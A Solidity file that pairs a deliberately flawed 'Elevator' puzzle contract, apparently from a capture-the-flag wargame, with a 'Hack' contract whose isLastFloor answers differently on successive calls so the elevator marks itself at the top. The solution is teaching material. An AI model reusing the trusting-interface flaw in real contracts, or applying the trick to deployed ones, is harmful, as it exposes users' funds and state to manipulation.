// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;


/**
This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.
**/
interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

interface ElevatorI {
  function goTo(uint _floor) external;
}

contract Hack is Building {

  ElevatorI elevator;
   uint public floor = 0;

  constructor(address _add) {
   elevator =  ElevatorI(_add);
  }

   function setFLoor(uint _floor) public {
     floor = _floor;
   }
 
  function isLastFloor(uint _floor) public override returns(bool) {
    bool res =  _floor == floor;
    floor++;
    return res;
  }

  function hack() public{
    elevator.goTo(1);
  }

  
}
